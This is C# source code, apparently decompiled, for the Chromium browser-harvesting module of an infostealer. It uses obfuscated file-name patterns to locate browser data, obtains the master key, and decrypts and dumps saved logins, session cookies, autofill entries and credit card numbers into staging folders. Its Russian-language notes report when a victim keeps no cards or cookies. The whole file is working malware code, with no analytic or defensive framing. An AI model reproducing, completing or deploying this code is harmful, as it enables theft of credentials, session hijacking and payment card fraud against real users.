using EntryLoader;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Web;

internal class EGChromeC
{
	protected static Chrome chrome = EntryPoint.chrome;

	protected static int CCookies = 0;

	protected static int CPasswords = 0;

	protected static int cfill = 0;

	protected static int CCards = 0;

	public static void Start()
	{
		string[] search_files = new string[4]
		{
			"co*es",
			"log*ta",
			"we*ata",
			"loc*ate"
		};
		List<string> _out = new List<string>();
		List<string> _out2 = new List<string>();
		Recursive.Search(Buffer.path_lad, ref _out, Buffer.string_0, search_files, 3);
		Recursive.Search(Buffer.path_ad, ref _out2, Buffer.string_0, search_files, 3);
		List<string> list = null;
		list = ((_out.Count() > 1 && _out2.Count() > 1) ? _out.Concat(_out2).ToList() : ((_out.Count() > 1) ? _out : ((_out2.Count() > 1) ? _out2 : null)));
		bool flag = false;
		string text = "";
		int num = 0;
		int num2 = 0;
		if (!Directory.Exists($"{Buffer.path_l}Browsers"))
		{
			Directory.CreateDirectory($"{Buffer.path_l}Browsers");
		}
		if (!Directory.Exists($"{Buffer.path_l}Autofill"))
		{
			Directory.CreateDirectory($"{Buffer.path_l}Autofill");
		}
		if (!Directory.Exists($"{Buffer.path_l}Cards"))
		{
			Directory.CreateDirectory($"{Buffer.path_l}Cards");
		}
		if (list != null)
		{
			foreach (string item in list)
			{
				string text2 = Path.GetFileName(item).ToLower();
				if (!flag && text2.Contains("state"))
				{
					chrome.GETMasterKey(item);
					flag = true;
				}
				else if (text2.Contains("login"))
				{
					string text3 = PasswordParse(item);
					text += (string.IsNullOrEmpty(text3) ? "" : $"{text3.Trim()}\n\n");
				}
				else if (text2.Contains("cookie"))
				{
					num++;
					CookieParse(item, string.Format("{0}Browsers\\[{1}-{2}] Cookies.txt", Buffer.path_l, item.Split(new string[1]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split('\\')[1], num));
				}
				else if (text2.Contains("web"))
				{
					num2++;
					fillParse(item, string.Format("{0}Autofill\\[{1}-{2}] Autofill.txt", Buffer.path_l, item.Split(new string[1]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split('\\')[1], num2));
					CCParse(item, string.Format("{0}Cards\\[{1}-{2}] Cards.txt", Buffer.path_l, item.Split(new string[1]
					{
						"AppData\\"
					}, StringSplitOptions.None)[1].Split('\\')[1], num2));
				}
			}
		}
		if (!string.IsNullOrEmpty(text.Trim()))
		{
			File.WriteAllText($"{Buffer.path_l}Browsers\\Passwords.txt", text.Trim().Replace("\n", Environment.NewLine));
		}
		Buffer.XBufferData[0] = CCookies.ToString();
		Buffer.XBufferData[1] = CPasswords.ToString();
		Buffer.XBufferData[10] = cfill.ToString();
		Buffer.XBufferData[11] = CCards.ToString();
		if (Directory.GetFiles($"{Buffer.path_l}Browsers", "*.txt").Count() == 0)
		{
			File.WriteAllText($"{Buffer.path_l}Browsers\\info.txt", $"{Buffer.head}Похоже что пользователь удаляет свои куки и пароли. Или же браузер не определен.");
		}
		if (Directory.GetFiles($"{Buffer.path_l}Autofill", "*.txt").Count() == 0)
		{
			File.WriteAllText($"{Buffer.path_l}Autofill\\info.txt", $"{Buffer.head}Похоже что пользователь не сохраняет автофилл. Или же браузер не определен.");
		}
		if (Directory.GetFiles($"{Buffer.path_l}Cards", "*.txt").Count() == 0)
		{
			File.WriteAllText($"{Buffer.path_l}Cards\\info.txt", $"{Buffer.head}Карты не найдены. Похоже что пользователь не использует карты для оплаты.");
		}
	}

	protected static void CCParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = $"{Buffer.path_t}{GetRandom.String()}";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, overwrite: true);
				}
				catch
				{
					try
					{
						text = $"{Buffer.path_ds}{GetRandom.String()}";
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, overwrite: true);
					}
					catch
					{
						return;
					}
				}
				string text2 = "";
				if (File.ReadAllLines(text).Length >= 75)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("CC");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					for (int i = 0; i < num; i++)
					{
						try
						{
							if (i < 100 || !string.IsNullOrEmpty(text2))
							{
								if (!string.IsNullOrEmpty(sqlite.GetValue(i, 1)))
								{
									string text3 = null;
									try
									{
										text3 = chrome.Decrypt(sqlite.GetValue(i, 12), v80: false);
										if (string.IsNullOrEmpty(text3))
										{
											text3 = chrome.Decrypt(sqlite.GetValue(i, 12));
										}
									}
									catch
									{
										continue;
									}
									text2 += $"\n\nНазвание: {sqlite.GetValue(i, 1)}.\nНомер: {text3}.\nМесяц/Год: {sqlite.GetValue(i, 2)}/{sqlite.GetValue(i, 3)}.\nСчет: {sqlite.GetValue(i, 9)}.";
									CCards++;
								}
								continue;
							}
						}
						catch
						{
							continue;
						}
						break;
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				text2 = text2.Trim().Replace("\n", Environment.NewLine);
				if (!string.IsNullOrEmpty(text2))
				{
					File.WriteAllText(save, text2);
				}
			}
		}
		catch
		{
		}
	}

	protected static void fillParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = $"{Buffer.path_t}{GetRandom.String()}";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, overwrite: true);
				}
				catch
				{
					try
					{
						text = $"{Buffer.path_ds}{GetRandom.String()}";
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, overwrite: true);
					}
					catch
					{
						return;
					}
				}
				string text2 = "";
				if (File.ReadAllLines(text).Length >= 75)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("Autofill");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					for (int i = 0; i < num; i++)
					{
						try
						{
							if (i < 100 || !string.IsNullOrEmpty(text2))
							{
								if (!string.IsNullOrEmpty(sqlite.GetValue(i, 0)) && !string.IsNullOrEmpty(sqlite.GetValue(i, 1)))
								{
									text2 += $"\n\n\nType: {sqlite.GetValue(i, 0)}\nValue: {Encoding.UTF8.GetString(Encoding.Default.GetBytes(sqlite.GetValue(i, 1)))}";
									cfill++;
								}
								continue;
							}
						}
						catch
						{
							continue;
						}
						break;
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
				}
				text2 = text2.Trim().Replace("\n", Environment.NewLine);
				if (!string.IsNullOrEmpty(text2))
				{
					File.WriteAllText(save, text2);
				}
			}
		}
		catch
		{
		}
	}

	protected static string PasswordParse(string path)
	{
		try
		{
			if (!File.Exists(path))
			{
				return "";
			}
			string text = "";
			string text2 = $"{Buffer.path_t}{GetRandom.String()}";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			try
			{
				File.Copy(path, text2, overwrite: true);
			}
			catch
			{
				try
				{
					text2 = $"{Buffer.path_ds}{GetRandom.String()}";
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
					File.Copy(path, text2, overwrite: true);
				}
				catch
				{
					return null;
				}
			}
			if (File.ReadAllLines(text2).Length >= 37)
			{
				Sqlite sqlite = new Sqlite(text2);
				sqlite.ReadTable("logins");
				int num = 0;
				try
				{
					num = sqlite.GetRowCount();
				}
				catch
				{
					return "";
				}
				for (int i = 0; i < num; i++)
				{
					try
					{
						string value = sqlite.GetValue(i, 0);
						string value2 = sqlite.GetValue(i, 3);
						string text3 = null;
						try
						{
							text3 = chrome.Decrypt(sqlite.GetValue(i, 5), v80: false);
							if (string.IsNullOrEmpty(text3))
							{
								text3 = chrome.Decrypt(sqlite.GetValue(i, 5));
							}
						}
						catch
						{
							continue;
						}
						if (!string.IsNullOrEmpty(value.Trim()) && !string.IsNullOrEmpty(value2.Trim()) && !string.IsNullOrEmpty(text3.Trim()))
						{
							text += "=====================================\n";
							text += $"URL: {value}\n";
							text += $"Login: {value2}\n";
							text += $"Password: {text3}\n";
							text += "=====================================\n\n\n";
							CPasswords++;
						}
					}
					catch
					{
					}
				}
				try
				{
					File.Delete(text2);
				}
				catch
				{
				}
				return text.Replace("\n", Environment.NewLine).Trim();
			}
			return "";
		}
		catch
		{
			return "";
		}
	}

	protected static void CookieParse(string path, string save)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = $"{Buffer.path_t}{GetRandom.String()}";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				try
				{
					File.Copy(path, text, overwrite: true);
				}
				catch
				{
					try
					{
						text = $"{Buffer.path_ds}{GetRandom.String()}";
						if (File.Exists(text))
						{
							File.Delete(text);
						}
						File.Copy(path, text, overwrite: true);
					}
					catch
					{
						return;
					}
				}
				if (File.ReadAllLines(text).Length >= 21)
				{
					Sqlite sqlite = new Sqlite(text);
					sqlite.ReadTable("cookies");
					int num = 0;
					try
					{
						num = sqlite.GetRowCount();
					}
					catch
					{
						return;
					}
					string text2 = "";
					int num2 = (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
					int num3 = 31104000;
					for (int i = 0; i < num; i++)
					{
						try
						{
							string text3 = null;
							try
							{
								text3 = chrome.Decrypt(sqlite.GetValue(i, 12), v80: false);
								if (string.IsNullOrEmpty(text3))
								{
									text3 = chrome.Decrypt(sqlite.GetValue(i, 12));
								}
							}
							catch
							{
								continue;
							}
							text2 += string.Format("{0}\tTRUE\t{1}\t{2}\t{3}\t{4}\t{5}{6}", sqlite.GetValue(i, 1), sqlite.GetValue(i, 4), (sqlite.GetValue(i, 6) == "1") ? "TRUE" : "FALSE", num2 + num3, sqlite.GetValue(i, 2), HttpUtility.UrlDecode(text3).Contains("\"") ? text3 : HttpUtility.UrlDecode(text3), Environment.NewLine);
							CCookies++;
						}
						catch
						{
						}
					}
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
					if (!string.IsNullOrEmpty(text2))
					{
						File.WriteAllText(save, $"# Netscape HTTP Cookie File{Environment.NewLine}{text2.Trim()}");
					}
				}
			}
		}
		catch
		{
		}
	}
}
